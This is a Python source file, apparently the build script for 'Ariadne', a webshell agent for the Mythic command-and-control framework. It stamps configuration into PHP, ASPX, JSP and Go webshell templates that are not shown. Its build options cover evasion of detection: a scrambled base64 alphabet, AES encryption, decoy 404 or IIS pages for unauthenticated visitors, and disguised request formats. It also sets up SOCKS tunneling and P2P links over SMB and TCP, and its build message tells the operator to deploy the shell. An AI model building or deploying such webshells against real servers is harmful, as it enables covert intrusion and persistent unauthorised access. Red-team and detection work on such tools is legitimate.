import pathlib
import os
import uuid
import secrets
import base64
import logging
import re

from jinja2 import Environment

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

from ..evasion import generate_deformed_alphabet

logger = logging.getLogger("ariadne.builder")

EXT_MAP = {
    "php": "php",
    "aspx": "aspx",
    "ashx": "ashx",
    "jsp": "jsp",
    "jspx": "jspx",
    "go": "go",
}


class Ariadne(PayloadType):
    name = "ariadne"
    file_extension = "php"
    author = "@Lavender-exe"
    semver = "1.0.0"
    supported_os = [SupportedOS.Windows, SupportedOS.Linux]
    wrapper = False
    wrapped_payloads = []
    note = "Webshell agent supporting PHP, ASPX, ASHX, JSP, JSPX, and Go with SOCKS tunneling and P2P."
    supports_dynamic_loading = True
    c2_profiles = ["ariadne_webshell"]
    mythic_encrypts = True
    translation_container = "AriadneTranslator"

    agent_path = pathlib.Path(__file__).resolve().parent.parent
    agent_icon_path = agent_path / "assets" / "ariadne.png"
    agent_code_path = agent_path / "agent_code"

    build_parameters = [
        # --- Main ---
        BuildParameter(
            name="language",
            group_name="Main",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["php", "aspx", "ashx", "jsp", "jspx", "go"],
            default_value="php",
            description="Webshell language / server technology",
        ),
        BuildParameter(
            name="debug",
            group_name="Main",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Enable debug output in the webshell",
        ),
        # --- Authentication ---
        BuildParameter(
            name="auth_method",
            group_name="Authentication",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["cookie", "header", "parameter"],
            default_value="cookie",
            description="How the container authenticates to the webshell",
        ),
        BuildParameter(
            name="auth_name",
            group_name="Authentication",
            parameter_type=BuildParameterType.String,
            default_value="PHPSESSID",
            description="Name of the cookie, header, or parameter used for authentication",
        ),
        BuildParameter(
            name="auth_value",
            group_name="Authentication",
            parameter_type=BuildParameterType.String,
            default_value="",
            description="Authentication value (auto-generated if empty)",
        ),
        # --- Encoding ---
        BuildParameter(
            name="encoding",
            group_name="Encoding",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["deformed_base64", "standard_base64", "hex"],
            default_value="deformed_base64",
            description="Payload encoding scheme",
        ),
        BuildParameter(
            name="encoding_password",
            group_name="Encoding",
            parameter_type=BuildParameterType.String,
            default_value="",
            description="Password for deformed base64 alphabet generation (auto-generated if empty)",
            hide_conditions=[
                HideCondition(name="encoding", operand=HideConditionOperand.NotEQ, value="deformed_base64"),
            ],
        ),
        # --- Encryption ---
        BuildParameter(
            name="encryption",
            group_name="Encryption",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["aes256_cbc", "none"],
            default_value="aes256_cbc",
            description="Payload encryption method",
        ),
        BuildParameter(
            name="aes_key",
            group_name="Encryption",
            parameter_type=BuildParameterType.String,
            default_value="",
            description="AES-256 key in base64 (auto-generated if empty)",
            hide_conditions=[
                HideCondition(name="encryption", operand=HideConditionOperand.EQ, value="none"),
            ],
        ),
        # --- Evasion ---
        BuildParameter(
            name="request_template",
            group_name="Evasion",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["form_post", "json_api", "image_data", "xml_soap", "none"],
            default_value="form_post",
            description="HTTP request body format for wrapping encoded data",
        ),
        BuildParameter(
            name="request_param_name",
            group_name="Evasion",
            parameter_type=BuildParameterType.String,
            default_value="data",
            description="Form field / JSON key / XML element name for the payload data",
        ),
        BuildParameter(
            name="camouflage_page",
            group_name="Evasion",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["404", "blank", "iis_default", "none"],
            default_value="404",
            description="Decoy HTML page returned for unauthenticated requests",
        ),
        BuildParameter(
            name="response_status_code",
            group_name="Evasion",
            parameter_type=BuildParameterType.String,
            default_value="200",
            description="HTTP status code returned by the webshell for authenticated requests",
        ),
        BuildParameter(
            name="response_content_type",
            group_name="Evasion",
            parameter_type=BuildParameterType.String,
            default_value="text/html",
            description="Content-Type header for webshell responses",
        ),
        # --- P2P ---
        BuildParameter(
            name="enable_p2p_http",
            group_name="P2P",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="Enable HTTP-based P2P endpoint for agent linking",
        ),
        BuildParameter(
            name="enable_p2p_smb",
            group_name="P2P",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Enable SMB named pipe P2P listener (Windows ASPX/ASHX only)",
            hide_conditions=[
                HideCondition(name="language", operand=HideConditionOperand.NotEQ, value="aspx"),
                HideCondition(name="language", operand=HideConditionOperand.NotEQ, value="ashx"),
            ],
        ),
        BuildParameter(
            name="smb_pipe_name",
            group_name="P2P",
            parameter_type=BuildParameterType.String,
            default_value="ariadne",
            description="SMB named pipe name",
            hide_conditions=[
                HideCondition(name="enable_p2p_smb", operand=HideConditionOperand.EQ, value=False),
            ],
        ),
        BuildParameter(
            name="enable_p2p_tcp",
            group_name="P2P",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Enable TCP socket P2P listener",
        ),
        BuildParameter(
            name="tcp_port",
            group_name="P2P",
            parameter_type=BuildParameterType.String,
            default_value="7443",
            description="TCP port for P2P listener",
            hide_conditions=[
                HideCondition(name="enable_p2p_tcp", operand=HideConditionOperand.EQ, value=False),
            ],
        ),
        # --- SOCKS ---
        BuildParameter(
            name="enable_socks",
            group_name="SOCKS",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="Enable SOCKS5 proxy tunneling through the webshell",
        ),
        BuildParameter(
            name="read_interval_ms",
            group_name="SOCKS",
            parameter_type=BuildParameterType.String,
            default_value="100",
            description="SOCKS tunnel read poll interval in milliseconds",
            hide_conditions=[
                HideCondition(name="enable_socks", operand=HideConditionOperand.EQ, value=False),
            ],
        ),
        BuildParameter(
            name="max_read_size",
            group_name="SOCKS",
            parameter_type=BuildParameterType.String,
            default_value="524288",
            description="Maximum bytes per SOCKS tunnel read",
            hide_conditions=[
                HideCondition(name="enable_socks", operand=HideConditionOperand.EQ, value=False),
            ],
        ),
    ]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)

        try:
            params = {p.name: p.value for p in self.build_parameters}

            language = params["language"]
            if language not in EXT_MAP:
                resp.status = BuildStatus.Error
                resp.build_message = f"Unsupported language: {language}"
                return resp

            # Read URL from C2 profile
            webshell_url = ""
            for c2 in self.c2info:
                c2_params = c2.get_parameters_dict()
                webshell_url = c2_params.get("webshell_url", "")
                break

            # Auto-generate values if empty
            if not params["auth_value"]:
                params["auth_value"] = uuid.uuid4().hex
            if not params["encoding_password"] and params["encoding"] == "deformed_base64":
                params["encoding_password"] = secrets.token_urlsafe(16)
            if not params["aes_key"] and params["encryption"] == "aes256_cbc":
                params["aes_key"] = base64.b64encode(secrets.token_bytes(32)).decode()

            # Generate evasion config

            deformed_alphabet = ""
            if params["encoding"] == "deformed_base64":
                deformed_alphabet = generate_deformed_alphabet(params["encoding_password"])

            camouflage_html = ""
            if params["camouflage_page"] != "none":
                camo_path = self.agent_code_path / "camouflage" / f"{params['camouflage_page']}.html"
                if camo_path.exists():
                    camouflage_html = camo_path.read_text(encoding="utf-8")

            # Stamp template

            template_path = self.agent_code_path / "templates" / f"base.{language}"
            if not template_path.exists():
                resp.status = BuildStatus.Error
                resp.build_message = f"Template not found: {template_path}"
                return resp

            template = template_path.read_text(encoding="utf-8")

            # Jinja2 preprocessing: strip commands not selected by the operator
            selected_commands = self.commands.get_commands()
            jinja_env = Environment(
                block_start_string="[%",
                block_end_string="%]",
                variable_start_string="[=",
                variable_end_string="=]",
                comment_start_string="[#",
                comment_end_string="#]",
                keep_trailing_newline=True,
            )
            jinja_tmpl = jinja_env.from_string(template)
            template = jinja_tmpl.render(commands=selected_commands)

            # Escape camouflage HTML for embedding in the target language
            escaped_camo = self._escape_for_language(camouflage_html, language)

            bm = {True: "true", False: "false"}

            replacements = {
                "%UUID%": self.uuid,
                "%AUTH_METHOD%": params["auth_method"],
                "%AUTH_NAME%": params["auth_name"],
                "%AUTH_VALUE%": params["auth_value"],
                "%ENCODING%": params["encoding"],
                "%DEFORMED_ALPHABET%": deformed_alphabet,
                "%ENCRYPTION%": params["encryption"],
                "%AES_KEY%": params["aes_key"],
                "%REQUEST_TEMPLATE%": params["request_template"],
                "%REQUEST_PARAM_NAME%": params["request_param_name"],
                "%CAMOUFLAGE_HTML%": escaped_camo,
                "%RESPONSE_STATUS_CODE%": params["response_status_code"],
                "%RESPONSE_CONTENT_TYPE%": params["response_content_type"],
                "%ENABLE_SOCKS%": bm[params["enable_socks"]],
                "%ENABLE_P2P_HTTP%": bm[params["enable_p2p_http"]],
                "%ENABLE_P2P_TCP%": bm[params.get("enable_p2p_tcp", False)],
                "%TCP_PORT%": params.get("tcp_port", "7443"),
                "%DEBUG%": bm[params["debug"]],
            }

            stamped = template
            for token, value in replacements.items():
                stamped = stamped.replace(token, str(value))

            resp.payload = stamped.encode("utf-8")
            resp.updated_filename = f"ariadne.{EXT_MAP[language]}"

            resp.build_message = (
                f"Ariadne {language.upper()} webshell built. "
                f"Deploy to {webshell_url} and link from Starburst via link_webshell."
            )

        except Exception as e:
            resp.status = BuildStatus.Error
            resp.build_message = f"Build error: {str(e)}"
            logger.exception("Build failed")

        return resp

    def _escape_for_language(self, html: str, language: str) -> str:
        """Escape HTML content for embedding as a string literal in the target language."""
        if not html:
            return ""
        if language == "php":
            return html.replace("\\", "\\\\").replace("'", "\\'")
        elif language in ("aspx", "ashx"):
            return html.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")
        elif language == "jsp":
            return html.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")
        elif language == "jspx":
            escaped = html.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")
            return escaped.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        elif language == "go":
            return html.replace("`", "` + \"`\" + `")
        return html
